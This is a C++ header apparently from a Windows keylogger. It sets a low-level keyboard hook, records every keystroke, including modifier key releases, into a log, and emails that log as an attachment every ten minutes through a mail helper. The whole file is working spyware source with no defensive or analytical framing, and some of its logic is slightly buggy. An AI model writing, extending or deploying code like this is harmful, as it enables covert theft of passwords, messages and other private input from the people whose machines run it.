#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

void TimerSendMail()
{
    if (keylog.empty())
        return;
    std::string last_file = IO::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("Can't create file :( '" + keylog + "'");
        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]", "Yo!! \n This is attachment file! :v \n"
                           "Just testing! \n Mi Doflamingo^^ \n" + keylog,
                           IO::GetOurPath(true) + last_file);
    if (x != 7)
        Helper::WriteAppLog("Send mail fail :'( \n Error code: " + Helper::ToString(x));
    else
        keylog = "";
}

//Timer MailTimer(TimerSendMail, 1000*60*60*3, Timer::Infinite);
Timer MailTimer(TimerSendMail, 1000*60*10, Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyboarProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if (nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;
    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if (kbs->vkCode == VK_RETURN) keylog += '\n';
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL
         || key == VK_LCONTROL
         || key == VK_RCONTROL
         || key == VK_SHIFT
         || key == VK_RSHIFT
         || key == VK_LSHIFT
         || key == VK_MENU
         || key == VK_LMENU
         || key == VK_RMENU
         || key == VK_CAPITAL
         || key == VK_NUMLOCK
         || key == VK_LWIN
         || key == VK_RWIN
        )
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }
    return CallNextHookEx(eHook, nCode, wparam, lparam);
}
    bool InstallHook()
    {
        Helper::WriteAppLog("Hook started.... Timer started");
        MailTimer.Start(true);

        eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboarProc,
                                 GetModuleHandle(NULL),0);
        return eHook == NULL;
    }
    bool UninstallHook()
    {
        BOOL b = UnhookWindowsHookEx(eHook);
        eHook = NULL;
        return (bool)b;
    }

    bool IsHook()
    {
        return (bool)(eHook == NULL);
    }



#endif // KEYBHOOK_H
